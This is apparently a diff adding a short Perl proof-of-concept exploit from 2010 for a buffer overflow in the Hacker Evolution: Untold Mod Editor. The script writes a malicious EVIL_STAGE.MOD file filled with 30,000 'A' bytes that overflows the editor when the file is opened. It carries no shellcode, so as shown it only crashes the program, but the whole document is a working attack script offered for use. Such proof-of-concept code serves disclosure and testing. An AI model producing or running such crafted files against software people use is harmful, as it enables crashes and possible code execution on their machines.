@@ -1,0 +1,17 @@
+#!/usr/bin/perl
+# Title         : Hacker Evolution: untold Mod Editor buffer overflow 
+# Date          : June 19, 2010
+# Author        : gunslinger_ <yudha.gunslinger@gmail.com>
+# Web		: http://devilzc0de.com
+# Blog		: http://gunslingerc0de.wordpress.com
+# Software Link : http://www.exosyphen.com/page_hacker-evolution-untold.html
+# Version       : 2.00.001
+# Tested on     : Windows XP SP2
+# Open Hacker Evolution Mod editor -> open file -> EVIL_STAGE.MOD
+
+my $file= "EVIL_STAGE.MOD";
+my $junk= "\x41" x 30000;
+open($FILE,">$file");
+print $FILE "$junk";
+close($FILE);
+print "MOD File Created successfully\n";
